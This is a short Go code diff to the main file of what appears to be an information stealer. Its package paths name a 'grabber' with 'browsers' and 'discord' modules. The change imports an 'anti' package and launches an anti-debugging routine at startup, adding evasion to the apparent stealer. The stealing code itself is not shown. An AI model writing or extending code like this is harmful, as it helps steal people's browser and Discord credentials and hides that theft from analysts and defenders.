@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"kdot/grabber/anti"
 	"kdot/grabber/browsers"
 	"kdot/grabber/discord"
 	"os"
@@ -13,6 +14,8 @@ import (
 
 func main() {
 	startTime := time.Now()
+
+	go anti.AntiDebug()
 
 	var wg sync.WaitGroup
 	wg.Add(2)
